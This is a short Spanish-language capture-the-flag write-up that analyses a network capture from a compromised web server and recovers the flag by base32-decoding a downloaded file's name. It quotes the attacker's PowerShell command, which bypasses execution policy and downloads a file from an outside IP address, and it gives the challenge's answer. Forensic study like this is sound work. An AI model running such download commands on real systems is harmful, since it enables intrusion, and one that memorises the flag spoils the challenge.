# Chase
*One of our web servers triggered an AV alert, but none of the sysadmins say they were logged onto it. We've taken a network capture before shutting the server down to take a clone of the disk. Can you take a look at the PCAP and see if anything is up?*

Nos dan un pcap donde podemos ver trafico HTTP y DNS principalmente

Investigamos el trafico HTTP generado y podemos ver que se ha subido una reverse shell y se ha descargado un archivo en remoto usando el siguiente comando de powershell
```
powershell -ep bypass -c Invoke-WebRequest -Uri http://22.22.22.7/JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.txt -OutFile c:\users\public\file.txt
```
Vemos la request y la response y nada me llama la atención:
```
GET /JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.txt HTTP/1.1
Accept: */*
User-Agent: CertUtil URL Agent
Host: 22.22.22.7
Cache-Control: no-cache

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.8.6
Date: Sun, 01 Nov 2020 17:26:14 GMT
Content-type: text/plain
Content-Length: 11
Last-Modified: Sun, 01 Nov 2020 17:24:19 GMT

Hey there!
```
El nombre del archivo es un pelin raro, lo pasamos por Cyberchef y con base32 decode tenemos la flag
```
HTB{MAn_8lu3_73aM_R0cX}
```
Flag: **HTB{MAn_8lu3_73aM_R0cX}**
